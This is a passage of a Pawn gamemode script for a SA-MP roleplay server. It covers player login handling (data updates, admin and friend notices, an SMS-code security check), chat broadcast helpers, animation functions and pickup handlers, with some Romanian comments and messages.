		PlayerInfo[playerid][pCarkey11] = 0;
		PlayerInfo[playerid][pCarkey12] = 0;
		PlayerInfo[playerid][pCarkey13] = 0;
		PlayerInfo[playerid][pCarkey14] = 0;
		PlayerInfo[playerid][pCarkey15] = 0;
		PlayerInfo[playerid][pReg] = 1;
		SetPlayerInterior(playerid,0);
		new string[300],
			str[256],
			d,
			m,
			y,
			h,
			mine,
			s;
		getdate(y,m,d);
		gettime(h,mine,s);
		format(string,sizeof(string),  "%d-%02d-%02d %02d:%02d:%02d",y,m,d,h,mine,s);
		strmid(PlayerInfo[playerid][pRegistredDate], string, 0, strlen(string), 255);
		mysql_format(SQL,str,sizeof(str),"UPDATE users SET `pHealth`='100.0',`Team`='3',`Model`='250', `IP`='%s' WHERE `name`='%s'",playerip,PlayerInfo[playerid][pNormalName]);
		mysql_tquery(SQL,str,"","");
		Update(playerid,pCashx);
		Update(playerid,pLevelx);
		Update(playerid,pPhousekeyx);
		Update(playerid,pPhousekey2x);
		Update(playerid,pPbiskeyx);
		Update(playerid,pPnumberx);
		Update(playerid,pRegx);
		Update(playerid,pRegistredDatex);
		Update(playerid,pPcarkeyx);
		Update(playerid,pmotokeyx);
		Update(playerid,pprcarkey2x);
		Update(playerid,pPPluscarkeyx);
		Update(playerid,pPPluscarkey2x);
		Update(playerid,phelikeyx);
		Update(playerid,pprcarkeyx);
		Update(playerid,pCarkey7x);
		Update(playerid,pCarkey8x);
		Update(playerid,pCarkey9x);
		Update(playerid,pCarkey10x);
		Update(playerid,pCarkey11x);
		Update(playerid,pCarkey12x);
		Update(playerid,pCarkey13x);
		Update(playerid,pCarkey14x);
		Update(playerid,pCarkey15x);
	}
	if(PlayerInfo[playerid][pFightStyle] > 0)
	{
	    if(PlayerInfo[playerid][pFightStyle] == 1)
	    {
	        SetPlayerFightingStyle (playerid, FIGHT_STYLE_BOXING);
		}
		else if(PlayerInfo[playerid][pFightStyle] == 2)
	    {
	        SetPlayerFightingStyle (playerid, FIGHT_STYLE_KUNGFU);
		}
		else if(PlayerInfo[playerid][pFightStyle] == 3)
	    {
	        SetPlayerFightingStyle (playerid, FIGHT_STYLE_KNEEHEAD);
		}
		else if(PlayerInfo[playerid][pFightStyle] == 4)
	    {
	        SetPlayerFightingStyle (playerid, FIGHT_STYLE_GRABKICK);
		}
		else if(PlayerInfo[playerid][pFightStyle] == 5)
	    {
	        SetPlayerFightingStyle (playerid, FIGHT_STYLE_ELBOW);
		}
	}
	else if(PlayerInfo[playerid][pFightStyle] == 0)
	{
		SetPlayerFightingStyle (playerid, FIGHT_STYLE_NORMAL);
	}
    if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
    new string2[128];
    if(PlayerInfo[playerid][pTut] == 1)
    {
		SendClientMessage(playerid,COLOR_SERVER,"");
		SendClientMessage(playerid,COLOR_SERVER,"");
		SendClientMessage(playerid,COLOR_SERVER,"");
		SendClientMessage(playerid,COLOR_SERVER,"");
		SendClientMessage(playerid,COLOR_SERVER,"");
		SendClientMessage(playerid,COLOR_SERVER,"");
		SendClientMessage(playerid,COLOR_SERVER,"");
		SendClientMessage(playerid,COLOR_SERVER,"");
		SendClientMessage(playerid,COLOR_SERVER,"");
		SendClientMessage(playerid,COLOR_SERVER,"");
		SendClientMessage(playerid,COLOR_SERVER,"");
		SendClientMessage(playerid,COLOR_SERVER,"");
		SendClientMessage(playerid,COLOR_SERVER,"");
		SendClientMessage(playerid,COLOR_SERVER,"");
		SendClientMessage(playerid,COLOR_SERVER,"");
		SendClientMessage(playerid,COLOR_SERVER,"");
		SendClientMessage(playerid,COLOR_SERVER,"");
		SendClientMessage(playerid,COLOR_SERVER,"");
		SendClientMessage(playerid,COLOR_SERVER,"");
		SendClientMessage(playerid,COLOR_SERVER,"");
	}
	SetPlayerScore(playerid, PlayerInfo[playerid][pLevel]);
	new adminss=0, adminsafk=0, helperss=0, helpersafk=0;
	foreach(Player, ids2)
	{
		if(PlayerInfo[ids2][pAdmin] > 0)
		{
			adminss++;
			if(IsPlayerAFK[ids2] > 0)
			{
				adminsafk++;
			}
		}
		if(PlayerInfo[ids2][pHelper] > 0)
		{
			helperss++;
			if(IsPlayerAFK[ids2] > 0)
			{
				helpersafk++;
			}
		}
	}
	gPlayerLogged[playerid] = 1;
	new query[256],playeriddd,strings[128],namee[30];
	GetPlayerName(playerid, namee, sizeof(namee));
	if (PlayerInfo[playerid][pPremiumAccount] == 1)
	{
		SendClientMessage(playerid, COLOR_SERVER,"You are a Premium Account user!");
	}
	if (PlayerInfo[playerid][pAdmin] > 0)
	{
		format(string2, sizeof(string2), "You are a level %d admin. There are %d admins online (%d not afk).",PlayerInfo[playerid][pAdmin],adminss,(adminss-adminsafk));
		SendClientMessage(playerid, COLOR_SERVER,string2);
		format(string2, sizeof(string2), "HelloBot: %s has just logged in.",namee);
		ABroadCast(COLOR_ADMCHAT, string2,1);
	    HLChat(COLOR_ADMCHAT,string2);
	}
	if (PlayerInfo[playerid][pHelper] > 0)
	{
	    format(string2,sizeof(string2), "You are a level %d helper. There are %d helpers online (%d not afk).", PlayerInfo[playerid][pHelper],helperss,(helperss-helpersafk));
		SendClientMessage(playerid, COLOR_SERVER,string2);
		format(string2, sizeof(string2), "HelloBot: %s has just logged in.",namee);
		ABroadCast(COLOR_ADMCHAT, string2,1);
	    HLChat(COLOR_ADMCHAT,string2);
	}
	format(query,sizeof(query),"SELECT PlayerID FROM `friends` WHERE `FriendID`='%d'", PlayerInfo[playerid][pSQLID]);
	new Cache: resultt = mysql_query(SQL,query);
	if(cache_get_row_count() > 0)
	{
		for(new iddd, jddd = cache_get_row_count (); iddd != jddd; ++iddd)
		{
			playeriddd = cache_get_field_content_int(iddd, "PlayerID");
			foreach(Player, ids)
			{
				if(PlayerInfo[ids][pSQLID] == playeriddd)
				{
					format(strings,sizeof(strings),"{FFC266}** {FFFF00}Your friend, %s was logged on the server. {FFC266}**", namee);
					SendClientMessage(ids, COLOR_YELLOW, strings);
				}
			}
		}
	}
	cache_delete(resultt);
	if (PlayerInfo[playerid][pWantedLevel] > 0)
	{
		SetPlayerWantedLevel(playerid, PlayerInfo[playerid][pWantedLevel]);
		PlayerTextDrawShow(playerid, WantedText[playerid]);
		new str1[256];
        format(str1,sizeof(str1),"WANTED SCADE IN: ~r~%d MINUTE",wantedlost[playerid]/60+1);
		PlayerTextDrawSetString(playerid, WantedText[playerid], str1);
		SendClientMessage(playerid, COLOR_RED2, "Are you still pursued by the police. Level you wanted was restored.");
		wantedlost[playerid] = 1800;
		WantedPoints[playerid] = PlayerInfo[playerid][pWantedLevel]*2;
		DestroyDynamic3DTextLabel(WantedScris[playerid]);
		Tigaanel[playerid] = 1;
		new str2[256];
        format(str2,sizeof(str2),"{FF6600}Wanted Level: %d", PlayerInfo[playerid][pWantedLevel]);
        WantedScris[playerid] = CreateDynamic3DTextLabel(str2, COLOR_SERVER, 0, 0, -20, 20, playerid);
		Streamer_SetFloatData(STREAMER_TYPE_3D_TEXT_LABEL, WantedScris[playerid] , E_STREAMER_ATTACH_OFFSET_Z, 0.48);
	}
	SetSpawnInfo(playerid, PlayerInfo[playerid][pTeam], PlayerInfo[playerid][pModel], 300.6520,1899.8932,907.9097, 1.0, -1, -1, -1, -1, -1, -1);
    if(PlayerInfo[playerid][pClan] > 0)
    {
        new szName[25];
        if(PlayerInfo[playerid][pClanTag] == 1)
        {
            format(szName, sizeof(szName), "%s%s", ClanInfo[PlayerInfo[playerid][pClan]][cClanTag], PlayerInfo[playerid][pNormalName]);
            SetPlayerName(playerid, szName);
		}
		else if(PlayerInfo[playerid][pClanTag] == 2)
		{
            format(szName, sizeof(szName), "%s%s", PlayerInfo[playerid][pNormalName], ClanInfo[PlayerInfo[playerid][pClan]][cClanTag]);
            SetPlayerName(playerid, szName);
		}
	}
	if(gTeam[playerid] == 0)
	{
		gTeam[playerid] = 3;
	}
	else
	{
		gTeam[playerid] = PlayerInfo[playerid][pTeam];
	}
	if(PlayerInfo[playerid][pMember] != 0)
	{
	    new namex[25],disc[84];
	    GetPlayerName(playerid,namex,sizeof(namex));
	    format(disc,sizeof(disc),"(Group) {FFFFFF}%s from your group has just logged in.",namex);
	    SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_GENANNOUNCE, disc);
	    SCM(playerid,COLOR_GENANNOUNCE,disc);
	}
	if(PlayerInfo[playerid][pLevel] < 3) { PlayerInfo[playerid][pLevel] = 3;  SetPlayerScore(playerid, 3); Update(playerid, pLevelx); }
	if(PlayerInfo[playerid][pMember] != 0)
	{
		if(strlen(DynamicFactions[PlayerInfo[playerid][pMember]][fAnn]) > 0)
		{
		    new factioninfo[128];
			format(factioninfo,sizeof(factioninfo), "(Group) MOTD: {FFFFFF}%s.",DynamicFactions[PlayerInfo[playerid][pMember]][fAnn]);
			SCM(playerid,COLOR_GENANNOUNCE,factioninfo);
		}
	}
	if(PlayerInfo[playerid][pReg] != 0)
	{
		//SendClientMessage(playerid, COLOR_YELLOW, "Quest: Pe server se afla un event de colectare a 50 de inimi, pentru detalii folositi /quest.");
	}
	new sendername[30],
		playersip[64],
		iplog[256],
		qqerry[500];
	GetPlayerName(playerid,sendername,sizeof(sendername));
	GetPlayerIp(playerid,playersip,sizeof(playersip));
//	LogIP(playersip,PlayerInfo[playerid][pSQLID]);
	format(iplog,sizeof(iplog),"%s (%d) has been connected to the server (IP: %s).",sendername,playerid,playersip);
	SendIP(COLOR_SERVER,iplog);
	SpawnPlayer(playerid);
	if(PlayerInfo[playerid][pClan] > 0)
	{
		new id = PlayerInfo[playerid][pClan];
		if(ClanInfo[id][cClanVerificat] == 2)
		{
			mysql_format(SQL, qqerry, sizeof(qqerry), "SELECT * FROM `users` WHERE `id`='%d' AND `VerificareClan`='1'",PlayerInfo[playerid][pSQLID]);
			new Cache: verificare = mysql_query(SQL, qqerry);
			if(cache_get_row_count() > 0)
			{
				ClanInfo[id][cConectari]++;
				mysql_format(SQL,qqerry, sizeof(qqerry), "UPDATE `users` SET `VerificareClan` = '0' WHERE `id` = '%d'", PlayerInfo[playerid][pSQLID]);
				mysql_tquery(SQL,qqerry,"","");
				mysql_format(SQL,qqerry, sizeof(qqerry), "UPDATE `clans` SET `Conectari` = '%d' WHERE `clanID` = '%d'", ClanInfo[id][cConectari],id);
				mysql_tquery(SQL,qqerry,"","");
			}
			cache_delete(verificare);
			
		}	
	}
	mysql_format(SQL,qqerry, sizeof(qqerry), "UPDATE `users` SET `Status` = '1', `OnlineToday` = '1', `OnlineThisWeek` = '1', `LastIP` = '%s' WHERE `id` = '%d'", playersip, PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL,qqerry,"","");
	mysql_format(SQL,qqerry, sizeof(qqerry), "UPDATE `friends` SET `Status` = '1' WHERE `FriendID` = '%d'", PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL,qqerry,"","");
	printf("%s has been connected to the server (IP: %s).",sendername,playersip);
	PlayerTextDrawShow(playerid, logo[playerid]);
    //for(new i = 0; i < 18; i++) TextDrawHideForPlayer(playerid, LoginTD[i]);
	addVV(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], LYStringToLY(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], PlayerInfo[playerid][pAccount]));
	new numaienevoie = 0;
	gPlayerLogged[playerid] = 1;
	if(strlen(PlayerInfo[playerid][pNrTel]) < 10) return SCM(playerid, COLOR_YELLOW, "Your account does not have a preset telephone number, please use the command /bsecurity for further information.");
	if(strlen(PlayerInfo[playerid][pNrTel]) >= 10)
	{
		new ip[16];
		GetPlayerIp(playerid, ip, 16);
		new clasaip[64];
		strdel(ip, 8, strlen(ip));
		format(clasaip, sizeof(clasaip), "%s",ip);
		if(strcmp(clasaip, clasaipdb, true) != 0)
		{
			problemalogin[playerid] = 1;
			gPlayerLogged[playerid] = 0;
			new rezultate = 0;
			new codacc[128];
			new sqlupdate[1000];
			mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "SELECT * FROM `sms_telefon` WHERE `nume`='%s'",PlayerInfo[playerid][pNormalName]);
			new Cache: verificare = mysql_query(SQL, sqlupdate);
			if(cache_get_row_count() > 0)
			{
				rezultate = 1;
				for(new i, j = cache_get_row_count(); i != j; i++)
				{
					cache_get_field_content(i, "Cod", codacc);
				}
			}
			cache_delete(verificare);
			if(rezultate == 0)
			{
				new nr1 = 100+random(899);
				new nr2 = 100+random(899);
				format(codacc, 128, "BG%d%d",nr1,nr2);
				mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "INSERT INTO `sms_telefon` (`NrTel`,`Cod`,`nume`) VALUES ('%s','%s','%s')",PlayerInfo[playerid][pNrTel],
				codacc, PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL, sqlupdate, "", "");
			}	
			strcpy(codacces[playerid], codacc, 128);
			ShowPlayerDialog(playerid, DIALOG_BSECURITATE+2, DIALOG_STYLE_INPUT, "access account", "A message has been sent to your mobile phone number.\nIt contains code to access your account.\n\
			(!) Send access code may take up to a minute and a half.", "Check", "CANCEL");
			numaienevoie = 1;
		}
	}
	if(loginautomat[playerid] == 0)
	{
		if(numaienevoie == 0)
		{
			if(strlen(PlayerInfo[playerid][pCuvant]) == 4) SCM(playerid, COLOR_YELLOW, "Your account is not secure, use the command {FFFFFF}/securitate");
			if(strlen(PlayerInfo[playerid][pCuvant]) > 4 && strlen(PlayerInfo[playerid][pCuvant]) < 21)
			{
				SelectTextDraw(playerid, 0xFF0000FF);
				Securitate[playerid] = 1;
				securitatenr[playerid] = 1;
				gPlayerLogged[playerid] = 0;
				PlayerTextDrawSetString(playerid, SecuritateTD[playerid][5], "Introdu_parola_contului...");
				PlayerTextDrawSetString(playerid, SecuritateTD[playerid][6], "Introdu_cuvantul_cheie...");
				timercuvantcheie[playerid] = 60;
				PlayerTextDrawShow(playerid, SecuritateTD[playerid][0]);
				PlayerTextDrawShow(playerid, SecuritateTD[playerid][1]);
				PlayerTextDrawShow(playerid, SecuritateTD[playerid][2]);
				PlayerTextDrawShow(playerid, SecuritateTD[playerid][3]);
				PlayerTextDrawShow(playerid, SecuritateTD[playerid][4]);
				PlayerTextDrawShow(playerid, SecuritateTD[playerid][5]);
				PlayerTextDrawShow(playerid, SecuritateTD[playerid][6]);
				PlayerTextDrawShow(playerid, SecuritateTD[playerid][7]);
				PlayerTextDrawShow(playerid, SecuritateTD[playerid][8]);
			}
		}	
	}
	//if(PlayerInfo[playerid][pDailyBonus] == 1) SCM(playerid, COLOR_YELLOW, "Daily Bonus: Incearca-ti norocul la bonusul zilnic oferit de server, tasteaza comanda {FFFFFF}/spin.");
	if(PlayerInfo[playerid][pPhousekey] != 999)
	{
		mysql_format(SQL, qqerry, sizeof(qqerry), "UPDATE `houses` SET `PropInactiv`='0' WHERE `ID`='%d'",PlayerInfo[playerid][pPhousekey]);
		mysql_tquery(SQL, qqerry, "", "");
	}
	if(PlayerInfo[playerid][pPhousekey2] != 999)
	{
		mysql_format(SQL, qqerry, sizeof(qqerry), "UPDATE `houses` SET `PropInactiv`='0' WHERE `ID`='%d'",PlayerInfo[playerid][pPhousekey2]);
		mysql_tquery(SQL, qqerry, "", "");
	}
	if(PlayerInfo[playerid][pPbiskey] > 0 && PlayerInfo[playerid][pPbiskey] != 255)
	{
		mysql_format(SQL, qqerry, sizeof(qqerry), "UPDATE `bizz` SET `PropInactiv`='0' WHERE `ID`='%d'",PlayerInfo[playerid][pPbiskey]);
		mysql_tquery(SQL, qqerry, "", "");
	}
	if(PlayerInfo[playerid][pClan] > 0 && PlayerInfo[playerid][pCRank] > 6)
	{
		mysql_format(SQL, qqerry, sizeof(qqerry), "UPDATE `clans` SET `PropInactiv`='0' WHERE `clanID`='%d'",PlayerInfo[playerid][pClan]);
		mysql_tquery(SQL, qqerry, "", "");
		if(ClanInfo[PlayerInfo[playerid][pClan]][cClanVerificat] == 0)
		{
			SCM(playerid, COLOR_SERVER, "{0066FF}Clan Info: {FFFFFF}Your clan is not checked, use the command [/cupgrade] for details check!");
		}
	}
	if(PlayerInfo[playerid][pClan] > 0)
	{
		SCM(playerid, -1, "{ffffff}____________________________{0066ff}Clan MOTD{ffffff}____________________________");
		SCM(playerid, -1, ClanInfo[PlayerInfo[playerid][pClan]][cClanMOTD]);
	}
	if(PlayerInfo[playerid][pDailyBonus] == 1)
	{
		new x = playerid;
		if(ofertazilei == 1) SCM(x, COLOR_SERVER, "{0066FF}Daily offer: {FFFFFF}Payday Advance 5 sites on this day."),
		SCM(x, COLOR_SERVER, "{0066FF}Prize: {FFFFFF}Premium 150 points, 10 points Respect, $25,000,000");
		if(ofertazilei == 2) SCM(x, COLOR_SERVER, "{0066FF}Daily offer: {FFFFFF}Offer a player level (3-5) amount of $100,000 by /pay."),
		SCM(x, COLOR_SERVER, "{0066FF}Prize: {FFFFFF}30 Points Premium 5 points Respect, $5,000,000");
		if(ofertazilei == 3) SCM(x, COLOR_SERVER, "{0066FF}Daily offer: {FFFFFF}Win $100,000 the job Worker Career."),
		SCM(x, COLOR_SERVER, "{0066FF}Prize: {FFFFFF}60 Points Premium 7 points Respect, $8,000,000");
		if(ofertazilei == 4) SCM(x, COLOR_SERVER, "{0066FF}Daily offer: {FFFFFF}Payday accumulate eight sites on this day."),
		SCM(x, COLOR_SERVER, "{0066FF}Prize: {FFFFFF}Premium 300 points, 15 points Respect, $40,000,000");
	}
	/*new remain = ultimulomdezapada;
	for(new qs=0; qs<=50; qs++)
	{
		if(QEvent[playerid][qs] == 1)
		{
			remain--;
		}
	}
	if(remain > 0)
	{
		SCM(playerid, COLOR_SERVER, "{0066FF}Quest: {FFFFFF}Nu ai terminat misiunea de craciun, foloseste comanda /quest pentru mai multe informatii.");
	}*/
	return 1;
}

public OnPlayerPickUpDynamicPickup(playerid, pickupid)
{
    return 1;
}

public BroadCast(color,const string[])
{
	SendClientMessageToAll(color, string);
	return 1;
}


public LeaderChat(color,const string[])
{
	foreach(Player, i)
 	{
		if(gPlayerLogged[i] == 1)
		{
			if (PlayerInfo[i][pLeader] >= 1 || PlayerInfo[i][pAdmin] >= 1)
			{
			    if(toglc[i] == 0)
				{
					SendClientMessage(i, color, string);
				}
			}
		}
	}
	printf("%s", string);
	return 1;
}
public ABroadCast(color,const string[],level)
{
	foreach(Player, i)
	{
	    if(IsPlayerConnected(i))
	    {
			if(gPlayerLogged[i] == 1)
			{
				if (PlayerInfo[i][pAdmin] >= level && tog_admin[i] > 0)
				{
					SendClientMessage(i, color, string);
				}
			}
		}
	}
	printf("%s", string);
	return 1;
}

public SendIP(color,const string[])
{
	foreach(Player, i)
	{
		if (PlayerInfo[i][pAdmin] >= 1)
		{
			if(togip[i] == 1)
			{
				SendClientMessage(i, color, string);
			}
		}
	}
	return 1;
}
public HLChat(color,const string[])
{
	foreach(Player, i)
	{
		if(gPlayerLogged[i] == 1)
		{
			if (PlayerInfo[i][pHelper] >= 1)
			{
				SendClientMessage(i, color, string);
			}
		}
	}
	printf("%s", string);
	return 1;
}

public OOCOff(color,const string[])
{
	foreach(Player, i)
	{
	    if(!gOoc[i])
	    {
			SendClientMessage(i, color, string);
		}
	}
	return 1;
}

stock SendSplitMessage(playerid, color, final[])
{
    new len = strlen(final),
		_iL = len / EX_SPLITLENGTHH;
	if( ( len % EX_SPLITLENGTHH ) ) _iL++;
	new _Line[EX_SPLITLENGTHH+5];
	new _:_i@Index;
	while( _i@Index < _iL )
	{
		if( _i@Index == 0 )
			strmid( _Line, final, ( _i@Index * EX_SPLITLENGTHH ), ( _i@Index * EX_SPLITLENGTHH ) + EX_SPLITLENGTHH );
		else
			strmid( _Line, final, ( _i@Index * EX_SPLITLENGTHH ), ( _i@Index * EX_SPLITLENGTHH ) + EX_SPLITLENGTHH );

		if( _iL > 1 )
		{
			if( _i@Index > 0 )
			{
				format( _Line, sizeof _Line, "... %s", _Line );
			}
		}
		SendClientMessage(playerid, color, _Line);
		_i@Index++;
	}
    return 1;
}

public OOCNews(color,string[])
{
	foreach(Player, i)
	{
	    if(!gNews[i])
	    {
			SendSplitMessage(i, color, string);
		}
	}
	return 1;
}

public OOCNews2(color,const string[])
{
	foreach(Player, i)
	{
		SendClientMessage(i, color, string);
	}
	return 1;
}

public SendRadioMessage(member, color, string[])
{
	foreach(Player, i)
	{
		if(gPlayerLogged[i] > 0)
		{
			if(PlayerInfo[i][pMember] == member || PlayerInfo[i][pLeader] == member)
			{
				SendClientMessage(i, color, string);
			}
		}	
	}
	return 1;
}

public SendTeamMessage(member, color, string[])
{
	foreach(Player, i)
	{
		if(gPlayerLogged[i] > 0)
		{
			if(PlayerInfo[i][pMember] == member || PlayerInfo[i][pLeader] == member)
			{
				SendClientMessage(i, color, string);
			}
		}	
	}
	return 1;
}

public SendJobMessage(job, color, string[])
{
	foreach(Player, i)
	{
	    if(PlayerInfo[i][pJob] == job)
	    {
			SendClientMessage(i, color, string);
		}
	}
	return 1;
}
public SendFamilyMessage(family, color, string[])
{
	foreach(Player, i)
	{
        if(gPlayerLogged[i] == 1)
        {
		    if(PlayerInfo[i][pMember] == family || PlayerInfo[i][pLeader] == family)
		    {
	            if(!gFam[i])
	            {
					SendClientMessage(i, color, string);
				}
			}
		}
	}
	return 1;
}

public SendTeamBeepMessage(team, color, string[])
{
	foreach(Player, i)
	{
	    if(gTeam[i] == team)
	    {
			SendClientMessage(i, color, string);
		}
	}
	return 1;
}
stock nearByMessage(playerid, color, string[], Float: Distance3 = 12.0) {
	new
	    Float: nbCoords[3];

	GetPlayerPos(playerid, nbCoords[0], nbCoords[1], nbCoords[2]);

	foreach(Player, i) {
	        if(IsPlayerInRangeOfPoint(i, Distance3, nbCoords[0], nbCoords[1], nbCoords[2]) && (GetPlayerVirtualWorld(i) == GetPlayerVirtualWorld(playerid))) {
				SendClientMessage(i, color, string);
	    }
	}

	return 1;
}

stock CalculateBestScore(turfid)
{
    new bestid;
    if(WarInfo[turfid][wAttacker] != 0 && WarInfo[turfid][wFaction] != 0)
    {
        new bestscore,
            group1 = WarInfo[turfid][wAttacker],
            group2 = WarInfo[turfid][wFaction];
        foreach(Player, i)
        {
            if(group1 == PlayerInfo[i][pMember] || group2 == PlayerInfo[i][pMember])
            {
                new score;
                score = ucideri[i][turfid] - decese[i][turfid];
                if(score >= bestscore)
                {
                    bestscore = score;
                    bestid = i;
                }
            }
        }
    }
	return bestid;
}

stock CalculateWorstScore(turfid)
{
    new bestid;
    if(WarInfo[turfid][wAttacker] != 0 && WarInfo[turfid][wFaction] != 0)
    {
        new bestscore,
            group1 = WarInfo[turfid][wAttacker],
            group2 = WarInfo[turfid][wFaction];
        foreach(Player, i)
        {
            if(group1 == PlayerInfo[i][pMember] || group2 == PlayerInfo[i][pMember])
            {
                new score;
                score = ucideri[i][turfid] - decese[i][turfid];
                if(score <= bestscore)
                {
                    bestscore = score;
                    bestid = i;
                }
            }
        }
    }
    return bestid;
}

public SendEnemyMessage(color, string[])
{
	foreach(Player, i)
	{
	    if(gTeam[i] >= 3)
	    {
			SendClientMessage(i, color, string);
		}
	}
	return 1;
}

OnePlayAnim(playerid,animlib[],animname[], Float:Speed, looping, lockx, locky, lockz, lp)
{
	if(arefreeze[playerid] == 1) return SCM(playerid, COLOR_ERROR, "You can use animations when you freeze.");
	ApplyAnimation(playerid, animlib, animname, Speed, looping, lockx, locky, lockz, lp);
	return 1;
}

LoopingAnim(playerid,animlib[],animname[], Float:Speed, looping, lockx, locky, lockz, lp)
{
    if(arefreeze[playerid] == 1) return SCM(playerid, COLOR_ERROR, "You can use animations when you freeze.");
    gPlayerUsingLoopingAnim[playerid] = 1;
    ApplyAnimation(playerid, animlib, animname, Speed, looping, lockx, locky, lockz, lp);
    return 1;
}

StopLoopingAnim(playerid)
{
	gPlayerUsingLoopingAnim[playerid] = 0;
    ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0);
}

PreloadAnimLib(playerid, animlib[])
{
	ApplyAnimation(playerid,animlib,"null",0.0,0,0,0,0,0);
}
public OnPlayerPickUpPickup(playerid, pickupid)
{
	if(warobjects > 0)
	{
	    for(new warobj=0; warobj<200; warobj++)
	    {
	        if(pickupid == warobjj[warobj])
	    	{
	    	    if(IsAMember(playerid))
	    	    {
		    	    warobjects--;
	                DestroyPickup(warobjj[warobj]);
	                new string1[200],name[50];
	                GetPlayerName(playerid, name, sizeof(name));
	                format(string1,200,"%s has pickup a hearth.(+25HP)",name);
	                ProxDetector(12.0, playerid, string1, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	                new Float:healthx;
					GetPlayerHealth(playerid,healthx);
					if(healthx >= 75)
					{
					    SetPlayerHealthEx(playerid, 100);
					}
					else
					{
					    SetPlayerHealthEx(playerid, 25 + healthx);
					}
				}
	    	}
	    }
	}
	if(eventobjects > 0)
	{
	    for(new obj=0; obj<11; obj++)
	    {
	    	if(pickupid == objectevent[obj])
	    	{
	    	    eventobjects--;
	    	    new string[128],name[30];
	    	    GetPlayerName(playerid, name, sizeof(name));
	    	    GivePlayerCash(playerid,eventprizeobj[obj]);
	    	    Update(playerid,pCashx);
	    	    DestroyPickup(objectevent[obj]);
	    	    format(string,sizeof(string),"NR AdmBot: An object of the event was found %s. It won a prize $%s!",name,FormatNumber(eventprizeobj[obj]));
                OOCNews(COLOR_ORANGE,string);
                if(eventobjects > 0)
                {
                    format(string,sizeof(string),"NR AdmBot: Event continues. There are more %d objects found!",eventobjects);
                }
                else
                {
					format(string,sizeof(string),"NR AdmBot: Event ended. Thank you for participating!");
				}
               	OOCNews(COLOR_ORANGE,string);
				objectevent[obj] = 0;
	    	    eventprizeobj[obj] = 0;
			}
		}
	}
	/*for(new q=0; q<50; q++)
	{
		if(pickupid == QuestP[q])
		{
			if(QEvent[playerid][q] == 0)
			{
				new str[128],queryy[256];
				if(QuestWait[playerid] > 0)
				{
					format(str, sizeof(str),"Asteapta %d secunde inainte de a colecta o noua inima.", QuestWait[playerid]);
					SendClientMessage(playerid, COLOR_SERVER, str);
					return 1;
				}
				QEvent[playerid][q] = 1;
				QuestWait[playerid] = 120;
				mysql_format(SQL,queryy,sizeof(queryy),"UPDATE `users` SET `Quest%d`='1' WHERE `name`='%s'",q,PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,queryy,"","");
				new remain = 50;
				for(new qs=0; qs<=50; qs++)
				{
					if(QEvent[playerid][qs] == 1)
					{
						remain--;
					}
				}
				if(remain > 0)
				{
					format(str, sizeof(str),"Felicitari! Ai gasit o inima. Gaseste inca %d inimi pentru a primi un premiu special.", remain);
					SendClientMessage(playerid, COLOR_YELLOW, str);
				}
				else if(remain == 0)
				{
					new randomcash = 1500000 + random(1000000) + random(1500000), randomrp = 5 + random(10), name[30], randompremium = random(10), randompoints = 10 + random(30);
					GetPlayerName(playerid, name, sizeof(name));
					if(randompremium != 7)
					{
						format(str, sizeof(str),"Felicitari! Ai gasit toate cele 50 de inimi si ai primit $%s si %d puncte respect.", FormatNumber(randomcash), randomrp);
						SendClientMessage(playerid, COLOR_YELLOW, str);
						format(str, sizeof(str),"Quest: %s a gasit toate cele 50 de inimi si a primit $%s si %d puncte respect.", name, FormatNumber(randomcash), randomrp);
						SendClientMessageToAll(COLOR_SERVER, str);
					}
					else
					{
						format(str, sizeof(str),"Felicitari! Ai gasit toate cele 50 de inimi si ai primit $%s, %d puncte respect si %d puncte premium.", FormatNumber(randomcash), randomrp, randompoints);
						SendClientMessage(playerid, COLOR_YELLOW, str);
						format(str, sizeof(str),"Quest: %s a gasit toate cele 50 de inimi si a primit $%s, %d puncte respect si %d puncte premium.", name, FormatNumber(randomcash), randomrp, randompoints);
						SendClientMessageToAll(COLOR_SERVER, str);
						PlayerInfo[playerid][pPremiumPoints] += randompoints;
						Update(playerid, pPremiumPointsx);
					}
					GivePlayerCash(playerid, randomcash);
					PlayerInfo[playerid][pExp] += randomrp;
					Update(playerid, pCashx);
					Update(playerid, pRP);
				}
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "Ai gasit aceasta inima, continua sa cauti altele.");
		}
	}*/
	if(pickupid == pickuph)
	{
	    if(OrderReady[playerid] > 0)
	    {
       		if(PlayerInfo[playerid][pGunLic] == 0) return SendClientMessage(playerid, COLOR_SERVER,"{FFB870}You don't have gun license.");
	        switch (OrderReady[playerid])
	        {
	            case 1:
	            {
	                GivePlayerWeaponEx(playerid, 23, 100); GivePlayerWeaponEx(playerid, 31, 300); GivePlayerWeaponEx(playerid, 4, 1);
	                GivePlayerCash(playerid, - 5000);
	                SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You picked up your Ordered Package.");
					DynamicFactions[11][fBank] += 5000;
					new str2[184];
					mysql_format(SQL,str2,sizeof(str2),"UPDATE `factions` SET `Bank`='%d' WHERE `ID`='11'",DynamicFactions[11][fBank]);
					mysql_tquery(SQL,str2,"","");
			    }
	            case 2:
	            {
	                GivePlayerWeaponEx(playerid, 23, 200); GivePlayerWeaponEx(playerid, 34, 40); GivePlayerWeaponEx(playerid, 4, 1); GivePlayerWeaponEx(playerid, 29, 150); GivePlayerWeaponEx(playerid, 31, 300);
	                GivePlayerCash(playerid, - 8000);
	                SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You picked up your Ordered Package.");
					DynamicFactions[11][fBank] += 8000;
					new str2[184];
					mysql_format(SQL,str2,sizeof(str2),"UPDATE `factions` SET `Bank`='%d' WHERE `ID`='11'",DynamicFactions[11][fBank]);
					mysql_tquery(SQL,str2,"","");
			    }
	        }
	        OrderReady[playerid] = 0;
	    }
	}
	else if(pickupid == sip)
	{
	    GameTextForPlayer(playerid, "~w~School Instructors", 4000, 1);
	}
